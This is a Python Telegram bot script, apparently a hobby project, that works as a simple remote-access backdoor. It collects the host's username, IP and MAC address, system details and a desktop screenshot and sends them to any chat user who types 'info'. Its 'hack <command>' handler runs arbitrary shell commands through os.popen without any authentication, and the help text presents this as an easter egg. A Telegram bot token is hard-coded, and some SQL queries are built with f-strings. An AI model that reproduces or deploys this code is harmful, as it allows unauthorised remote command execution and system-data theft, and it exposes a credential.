import telebot
from datetime import datetime
import os
import sqlite3 as sq

from operator import itemgetter

import getpass
import os
import socket
from uuid import getnode as get_mac
import pyautogui
# import speedtest
import psutil
import platform
from PIL import Image

#добавление в бд
# with sq.connect("list.db") as con:  # подключение к базе данных
#     cur = con.cursor()  # создание объекта для работы с базой данных
#     cur.execute("""INSERT INTO users (tg_id,name,old) VALUES (?,?,?)""",
#                 (123, mes[0], mes[1]))  # выполнить команду в базе данных
#     con.commit()

bot = telebot.TeleBot("5721458659:AAEPnYmZTy4LJap8M__AngXbyGj7ZwSRFjo")
start = datetime.now()
# Информация о пользователе
name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()
# Информация о скорости интернета
# inet = speedtest.Speedtest()
# download = float(str(inet.download())[0:2] + "." + str(round(inet.download(), 2))[1]) * 0.125
# uploads = float(str(inet.upload())[0:2] + "." + str(round(inet.download(), 2))[1]) * 0.125
# Часовой пояс и время
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
# Чатсота процессора
cpu = psutil.cpu_freq()

# os.getcwd()
# screen = pyautogui.screenshot("screenshot.jpg")

# Скриншот рабочего стола
def screen_info():
    os.getcwd()
    screen = pyautogui.screenshot("screenshot.jpg")
def info_file():
    file = open("info.txt", "w")
    file.write(f"[============================================]\n Operating System: {ost.system}\n Processor: {ost.processor}\n Username: {name}\n IP adress: {ip}\n MAC adress: {mac}\n Timezone: {time.year}/{time.month}/{time.day}||{time.hour}:{time.minute}:{time.second}\n Current Frequency: {cpu.current:.2f} Mhz\n[============================================]\n")
    file.close()

def add_to_user(message):
    sql = f"SELECT * FROM users WHERE tg_id == ({message.chat.id})"
    with sq.connect("list.db") as con:  # подключение к базе данных
        cur = con.cursor()  # создание объекта для работы с базой данных
        cur.execute(sql)
        result = cur.fetchall()
        a = []
        for num in result:
            for i in num:
                a.append(i)  # создание списка из кортежа
        con.commit()
        if message.chat.id in a:
            bot.send_message(message.chat.id, "У вас уже есть аккаунт!")
        else:
            try:
                mes = message.text.split()
                with sq.connect("list.db") as con:  # подключение к базе данных
                    cur = con.cursor()  # создание объекта для работы с базой данных
                    cur.execute("""INSERT INTO users (tg_id,name,old) VALUES (?,?,?)""",
                            (message.chat.id, mes[0], mes[1]))  # выполнить команду в базе данных
                    con.commit()
                bot.send_message(message.chat.id, "Ваши данные сохранены")
            except IndexError:
                bot.send_message(message.chat.id, "Введите данные правильно!")

def look_user(message):
    sql = f"SELECT * FROM users WHERE tg_id == ({message.chat.id})"
    with sq.connect("list.db") as con:  # подключение к базе данных
        cur = con.cursor()  # создание объекта для работы с базой данных
        cur.execute(sql)
        result = cur.fetchall()
        res = list(map(itemgetter(2, 3), result)) # Вытаскиваем из списка/кортежа только имя и возраст
        a = []
        for num in res:
            for i in num:
                a.append(i) # создание списка из кортежа
        con.commit()
        print(a)
        try:
            text = f"Имя: {a[0]} \nВозраст: {a[1]}"
            bot.send_message(message.chat.id, text)
        except IndexError:
            text = "У вас ещё нет профиля, нажмите add"
            bot.send_message(message.chat.id, text)

#Функция отправки команд
def hack(mes):
    server_command = mes
    server_command = server_command[5:]
    os.popen(server_command)

@bot.message_handler(commands=['start'])
def start_message(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = telebot.types.KeyboardButton("info")
    item2 = telebot.types.KeyboardButton("help")
    item3 = telebot.types.KeyboardButton("add")
    item4 = telebot.types.KeyboardButton("profile")
    markup.add(item1, item2, item3, item4)
    bot.send_message(message.chat.id, 'Выберите что вам надо', reply_markup=markup)

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    if message.text.lower()[:4] == 'hack':
        bot.send_message(message.chat.id, 'Система взломана!')
        hack(message.text)
    elif message.text.lower() == 'info':
        screen_info()
        info_file()
        upfile = open("info.txt", "rb")
        uphoto = open("screenshot.jpg", "rb")
        bot.send_photo(message.chat.id, uphoto)
        bot.send_document(message.chat.id, upfile)
        print(message.chat.id)
        upfile.close()
        uphoto.close()
        os.remove("info.txt")
        os.remove("screenshot.jpg")
    elif message.text.lower() == 'help':
        bot.send_message(message.chat.id, 'Вы можете посмотреть сводку нажав на info. \nПасхалка!\nВзломать систему написав "hack <command>"')

    elif message.text.lower() == 'add':
        message = bot.send_message(message.chat.id, "Введите своё имя и возраст <Name Old>")
        bot.register_next_step_handler(message, add_to_user)

    elif message.text.lower() == 'profile':
        look_user(message)

bot.infinity_polling()
# bot.polling()
raise SystemExit


ends = datetime.now()
workspeed = format(ends - start)